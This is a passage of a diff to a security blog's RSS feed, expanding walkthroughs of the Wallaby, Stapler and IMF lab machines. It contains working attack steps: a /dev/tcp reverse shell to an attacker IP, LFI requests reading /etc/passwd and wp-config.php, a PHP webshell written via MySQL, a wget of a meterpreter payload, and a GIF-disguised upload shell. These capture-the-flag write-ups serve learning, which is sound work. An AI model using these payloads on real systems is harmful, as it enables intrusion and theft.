@@ -2,15 +2,12 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Boot2root on SecBlog</title>
-    <link>https://sec.alexflor.es/categories/boot2root/</link>
+    <link>https://sec.alexflor.es/categories/boot2root/index.xml</link>
     <description>Recent content in Boot2root on SecBlog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Untitled.</copyright>
-    <lastBuildDate>Fri, 30 Dec 2016 19:16:02 -0400</lastBuildDate>
-    
-	<atom:link href="https://sec.alexflor.es/categories/boot2root/index.xml" rel="self" type="application/rss+xml" />
-    
+    <atom:link href="https://sec.alexflor.es/categories/boot2root/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
       <title>B2R: Wallaby Walkthrough</title>
@@ -18,7 +15,135 @@
       <pubDate>Fri, 30 Dec 2016 19:16:02 -0400</pubDate>
       
       <guid>https://sec.alexflor.es/post/wallaby/</guid>
-      <description>Executive Summary This machine had an unlisted but open webapp path that allowed for remote command execution. After establishing a reverse shell as the limited user www-data, privilege checks showed the user was allowed to modify firewall rules. There was also an IRC server that contained a bot that allowed command execution through the use of the .run command. The command would only obey the user waldo so modification of the firewall allows an attacker to kick and assume the waldo identity.</description>
+      <description>
+
+&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;
+
+&lt;p&gt;This machine had an unlisted but open webapp path that allowed for remote command execution. After
+establishing a reverse shell as the limited user &lt;code&gt;www-data&lt;/code&gt;, privilege checks showed the user was allowed to
+modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
+through the use of the &lt;code&gt;.run&lt;/code&gt; command. The command would only obey the user &lt;code&gt;waldo&lt;/code&gt; so modification of the
+firewall allows an attacker to kick and assume the &lt;code&gt;waldo&lt;/code&gt; identity. Now the &lt;code&gt;.run&lt;/code&gt; command could be run and
+a reverse shell with the user &lt;code&gt;wallaby&lt;/code&gt; could be established. &lt;code&gt;wallaby&lt;/code&gt; had password-less sudo access, so
+elevating to the root user was trivial.&lt;/p&gt;
+
+&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;nmap - service enumeration&lt;/li&gt;
+&lt;li&gt;uniscan - webapp scanner&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h2&gt;
+
+&lt;p&gt;Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
+&lt;code&gt;uniscan&lt;/code&gt; but this failed and caused the VM to move the web application to a different port. It appeared that
+automated tools were going to make this challenge harder, not easier.&lt;/p&gt;
+
+&lt;p&gt;After another scan, we find our new port:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U7eKOCh.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/xuPADKd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Various sorts of manual testing gave us different messages:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WwMxNnj.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/IS2BlBh.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point, I decided to automate my enumeration of pages with a custom script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;for word in $(cat /usr/share/dirb/wordlists/common.txt); do
+    
+    # find pages whose last line does NOT contain the phrase &#39;what are you trying&#39; ( a 404, essentially )
+    curl -q &amp;quot;vm:60080/?page=$word&amp;quot; 2&amp;gt;/dev/null | tail -1 | grep -v &#39;what are you trying&#39;
+
+    if [[ $? -eq 0 ]]; then
+        #if the last command command completed succesfully, print the word we foun
+        echo $word
+    fi
+done | grep -v &amp;quot;/&amp;quot; # don&#39;t print results with slashes in them, they&#39;re false positives
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This output yielded the pages.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;contact
+mailer
+home
+index
+blacklist
+name
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The most interesting page here was &lt;code&gt;mailer&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TNJEtuI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I attempted to see if the &lt;code&gt;mail&lt;/code&gt; query parameter actually passed through as a system command. It did:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/9Yu6Zky.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the &lt;code&gt;mail&lt;/code&gt;
+query parameter:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.177/443 0&amp;gt;&amp;amp;1&amp;quot;
+
+# becomes
+
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/tWhvBSP.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerating this user&amp;rsquo;s privileges and networking, we determine that we have control of firewall rules,
+there&amp;rsquo;s a rule blocking incoming requests to port 6667, and that there&amp;rsquo;s an IRC server running locally.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1slTkmg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uxK21ov.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can clear the firewall rules with &lt;code&gt;sudo iptables -F&lt;/code&gt; and connect to the IRC server from the attacking
+machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/b0NDIKS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/IoX9DnK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we try to run the &lt;code&gt;.run&lt;/code&gt; command, &lt;code&gt;wallabysbot&lt;/code&gt; refuses.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/R5Vwo3f.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The code for the and configs for the bot are located in &lt;code&gt;/home/wallaby/.sopel&lt;/code&gt; and it indicates that we need
+to assume the nickname &lt;code&gt;waldo&lt;/code&gt; in order for us to be able to use this command. We can&amp;rsquo;t do that while waldo
+is still logged in so we boot them off with the use of our firewall.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/KCH7TX6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In a while, after a timeout, only &lt;code&gt;waldo&lt;/code&gt; should be ejected from the room, leaving the ability to steal his
+nick and command the bot.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1TnwYcT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With a reverse shell established, we can see that the wallaby user has full, passwordless &lt;code&gt;sudo&lt;/code&gt; access. From
+here, it&amp;rsquo;s just one command to &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ds0KVYg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!&lt;/p&gt;
+
+&lt;h2 id=&#34;additional-information&#34;&gt;Additional Information&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;User &lt;code&gt;waldo&lt;/code&gt; is running irssi within a tmux session. The socket is located in &lt;code&gt;/tmp/tmux-1000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;There exists an irssi DoS vulnerability that could have been used to boot the &lt;code&gt;waldo&lt;/code&gt; user to assume
+control of the bot.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;.py&lt;/code&gt; modules (which runs python commands), at the time of this writing makes an external call to an
+out-of-scope API. It does not run the python command on the target machine.&lt;/li&gt;
+&lt;li&gt;There are at least 3 ways to get a limited shell and at least 2 to get root.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
     </item>
     
     <item>
@@ -27,8 +152,168 @@
       <pubDate>Sat, 24 Dec 2016 23:45:38 -0500</pubDate>
       
       <guid>https://sec.alexflor.es/post/stapler/</guid>
-      <description>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
-Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user.</description>
+      <description>
+
+&lt;p&gt;Adding the IP address of the VM to the hosts file allows one to cut down on some typing.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/cazlgnf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;
+
+&lt;p&gt;This machine had several services running, some of which revealed employee names and accounts that could
+later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
+database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
+ran every 20 minutes as the &lt;code&gt;root&lt;/code&gt; user and that the script was writable to our non-privileged user. This was
+leveraged to create a &lt;code&gt;root&lt;/code&gt; shell by replacing the file contents with a malicious payload.&lt;/p&gt;
+
+&lt;h2 id=&#34;execution&#34;&gt;Execution&lt;/h2&gt;
+
+&lt;p&gt;An initial recon scan on the target revealed the following services:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; onetwopunch -t ip_addresses.txt -p tcp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YeosV0b.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All together, individual inspection of the services revealed a plethora of information about the company and
+its employees.
+This section will cover the most direct route to &lt;code&gt;root&lt;/code&gt;,
+but see the &lt;a href=&#34;#additional-discovery&#34;&gt;Additional Discovery&lt;/a&gt; section for that information.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code&gt;nikto&lt;/code&gt; against the service on port &lt;code&gt;12380&lt;/code&gt; revealed additional paths using the https protocol.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; nikto -host vm:12380
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DTF5i00.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The site hosted at &lt;code&gt;/blogblog&lt;/code&gt; is a Wordpress blog with a vulnerable plug-in, as discovered by &lt;code&gt;wpscan&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;wpscan -u https://vm:12380/blogblog/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uzdO1dx.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/U2NyDnu.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/LrEOKFq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/39646/&#34;&gt;This LFI vulnerability&lt;/a&gt; allows an attacker to read the contents
+of a file on the system by using that file as a &amp;ldquo;thumbnail&amp;rdquo; for a post. An attacker could use this to read
+the contents of the Wordpress configuration file which has database credentials. The user account list for
+this machine was also acquired using this method.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; curl -k &amp;quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=9898092807434134&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../../../../../etc/passwd&amp;quot;
+&amp;gt;&amp;gt; curl -k &amp;quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;amp;title=9898092807434134&amp;amp;short=rnd&amp;amp;term=rnd&amp;amp;thumb=../wp-config.php&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XMcARrC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By curling the &amp;ldquo;image&amp;rdquo; urls, the contents can be read.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CVtnKiK.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/rfez3zi.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
+remote code execution.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; mysql -h vm -u root -p wordpress
+
+mysql&amp;gt;&amp;gt; SELECT &#39;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&#39; INTO OUTFILE &#39;/root/www/rce.php&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/h0gsLrZ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
+shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;# start a web server to host the payload
+&amp;gt;&amp;gt; systemctl start apache2
+
+#create the payload in the web directory
+&amp;gt;&amp;gt; msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw &amp;gt; /var/www/html/qq.php
+
+# trigger remote commands that download the payload from the attacker&#39;s computer
+&amp;gt;&amp;gt; curl &amp;quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&amp;quot;
+&amp;gt;&amp;gt; curl &amp;quot;vm/rce.php?cmd=ls&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/5WdoFhk.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A listener/handler is configured and the reverse shell kicked off on the victim computer&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; msfconsole -x &amp;quot;use exploit/multi/handler&amp;quot;
+
+msfconsole&amp;gt;&amp;gt; set PAYLOAD php/meterpreter_reverse_tcp
+msfconsolemsfconsole&amp;gt;&amp;gt; set LPORT 443
+msfconsole&amp;gt;&amp;gt; exploit -j
+
+# start the shell
+&amp;gt;&amp;gt; curl &amp;quot;vm/qq.php&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Gxqwui2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An attacker can now enumerate the contents of the victim&amp;rsquo;s file system, allowing them identify any vulnerable
+or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
+running a world-modifiable file as root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/I0kuii9.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/bg9dpXH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Further inspection of this scheduled task:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WXEowHC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This task runs as the root user. All that was needed to become root was to replace the contents of the script
+with a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vFqTefn.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;additional-discovery&#34;&gt;Additional Discovery&lt;/h2&gt;
+
+&lt;p&gt;SMB enumeration and unprotected shares revealed some employee names and personal notes
+&lt;img src=&#34;https://i.imgur.com/VEFkW99.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
+the attacker.
+&lt;img src=&#34;https://i.imgur.com/vJBqGGF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The anonymous ftp login also leaks information.
+&lt;img src=&#34;https://i.imgur.com/fW3Nl8k.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/aFFIp9P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Port 80 scan initially returned what looked like a user&amp;rsquo;s dotfiles. This gave me the idea that someone may be
+running a web server from their home directory.
+&lt;img src=&#34;https://i.imgur.com/w3143f7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
+users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
+passwords for their machine accounts.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;&amp;gt;&amp;gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/v1GKKbb.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Without accessing the computer&amp;rsquo;s &lt;code&gt;/etc/passwd&lt;/code&gt; file, this gathering of information revealed the existence of
+the following employees and a accounts:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;barry
+dave
+elly
+fred
+garry
+harry
+heather
+john
+kathy
+pam
+peter
+scott
+tim
+vicki
+zoe
+&lt;/code&gt;&lt;/pre&gt;
+</description>
     </item>
     
     <item>
@@ -37,10 +322,211 @@ Executive Summary This machine had several services running, some of which revea
       <pubDate>Tue, 01 Nov 2016 19:16:02 -0400</pubDate>
       
       <guid>https://sec.alexflor.es/post/imf_walkthrough/</guid>
-      <description>After mapping the network and finding our IP address at 192.168.1.162, we can add it to our /etc/hosts temporarily to make things a little easier for us.
-echo &amp;quot;192.168.1.162 imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts  Lets see what kind of machine we&amp;rsquo;re dealing with.
-Ok, so web only. Great. nikto didn&amp;rsquo;t reveal any low-hanging fruit so let&amp;rsquo;s dive into the source.
-Check that out! Our first flag was hidden in http://imf/contact.php. This looks like base64.</description>
+      <description>&lt;p&gt;After mapping the network and finding our IP address at &lt;code&gt;192.168.1.162&lt;/code&gt;, we can add it to our &lt;code&gt;/etc/hosts&lt;/code&gt;
+temporarily to make things a little easier for us.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;echo &amp;quot;192.168.1.162     imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lets see what kind of machine we&amp;rsquo;re dealing with.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1DmhXnq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, so web only. Great. &lt;code&gt;nikto&lt;/code&gt; didn&amp;rsquo;t reveal any low-hanging fruit so let&amp;rsquo;s dive into the source.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/S4hPuB2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Check that out! Our first flag was hidden in &lt;code&gt;http://imf/contact.php&lt;/code&gt;. This looks like base64. After decoding
+we get the clue &lt;code&gt;allthefiles&lt;/code&gt;. Lets keep looking.&lt;/p&gt;
+
+&lt;p&gt;Going back to the source code, I found a javascript file that also looked like it was base64 but it didn&amp;rsquo;t
+return any results. After a while of going in circles I took my dog for a walk and pondered about what
+&amp;lsquo;allthefiles&amp;rsquo; could mean. When I came back and looked over the source code again, I saw this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ANZ1UgC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All the files, ey?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ik1rUga.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we visit that directory on our webapp&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/75xqVVJ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, no DB here. We&amp;rsquo;re dealing with a hardcoded password which means we&amp;rsquo;re dealing with an equaltiy operator
+on the backend or possibly the &lt;code&gt;strcmp()&lt;/code&gt; function. I messed around with nullbyte string termination exploits
+here for a while but ultimately ended up nowhere. Let&amp;rsquo;s assume we&amp;rsquo;re dealing with &lt;code&gt;strcmp&lt;/code&gt; since it&amp;rsquo;s easier
+to fool a function than to fool an operator.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/qo8t92C.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m not very good with PHP, but I&amp;rsquo;m guessing that I need this function to return a &lt;code&gt;0&lt;/code&gt; so I fired up
+&lt;a href=&#34;https://repl.it&#34;&gt;repl.it&lt;/a&gt; and started trying to break it. Turns out if you feed it the wrong type (it
+expects two strings), it seems to return a &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/iQiFPrC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So if we can feed this function an array from the web form, we might be able to bypass the password check. By
+changing the name of the form&amp;rsquo;s password field from &lt;code&gt;pass&lt;/code&gt; to &lt;code&gt;pass[]&lt;/code&gt;, we can do just that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DpxX4o7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the modified form, a BS password, and a username from the Contacts page, we get&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wB0UUP3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The decoded flag just has us click through to the CMS&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;root@kali:~                                                                                                                                                                                     ⍉
+❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
+continueTOcms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
+use LFI exploits here, modifying URLs, headers, HTTP methods&amp;hellip; nothing. I was trying to enter an empty
+&lt;code&gt;pagename&lt;/code&gt; for like the 100th time when I fat fingered the &amp;ldquo;enter&amp;rdquo; key and hit &lt;code&gt;&#39; + Enter&lt;/code&gt; at the same time
+when I saw this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Oqo4ZQg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SQL! Alright, fired up &lt;code&gt;sqlmap&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/izezAtP.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/uckNUTe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like we have an image at &lt;code&gt;imfadministrator/images/whiteboard.jpg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/BBLfAQY.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The QR Code is our next flag &lt;code&gt;flag4{dXBsb2FkcjkOMi5waHA=}&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;root@kali:~                                                                                                                                                                                     ⍉
+❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
+uploadr942.php   
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We navigate to &lt;code&gt;http://imf/imfadministrator/uploadr942.php&lt;/code&gt; and we get our uploader. After messing around
+with it a bit we can see that the response html from a successful upload has a hash of some sort. I&amp;rsquo;m
+guessing its the hashed version of the filename in the &lt;code&gt;/uploads&lt;/code&gt; folder.&lt;/p&gt;
+
+&lt;p&gt;Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
+db so it gets executed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8obNV4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s upload it!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ePzjKU9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Haha! Whoops. Alright what about just regular command execution:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;cat &amp;lt;&amp;lt;EOF &amp;gt; muahaha.gif
+GIF89a
+&amp;lt;?php \`id\` ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
+parameter. Let&amp;rsquo;s replace &lt;code&gt;id&lt;/code&gt; with &lt;code&gt;$cmd=$_GET[&#39;cmd&#39;]; echo $cmd&lt;/code&gt; and try again.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/v0uaGPw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets get a shell that&amp;rsquo;s easier to work with with &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/lXrjIik.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/dRelPbw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s time to get a sense of the machine we&amp;rsquo;re in. &amp;ldquo;Presence&amp;rdquo;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;interesting processes - knockd, sshd&lt;/li&gt;
+&lt;li&gt;interesting files (world readable, executable root files, etc) - &lt;code&gt;/usr/local/bin&lt;/code&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cat /usr/local/bin/access_codes #&amp;gt; SYN 7482,8279,9467&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/usr/local/bin/agent&lt;/code&gt; - connect to some sort of agent portal; download it&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;listening ports &lt;code&gt;netstat -plnt&lt;/code&gt; - 7788&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;It looks like we&amp;rsquo;ve got a hidden service running on 7788. To enable it, we have to &amp;lsquo;knock&amp;rsquo; in the right order
+so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SgDQYRk.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/SdM3380.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets decompile our downloaded binary at &lt;a href=&#34;https://retdec.com/decompilation-run/&#34;&gt;https://retdec.com/decompilation-run/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WnuLN8R.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see on line 49 where the authentication happens. It&amp;rsquo;s comparing against a string that was defined on
+line 37, &lt;code&gt;0x2ddd984&lt;/code&gt;. If we pop this into an online hex converter, we get &lt;code&gt;48093572&lt;/code&gt;&lt;/p&gt;
+
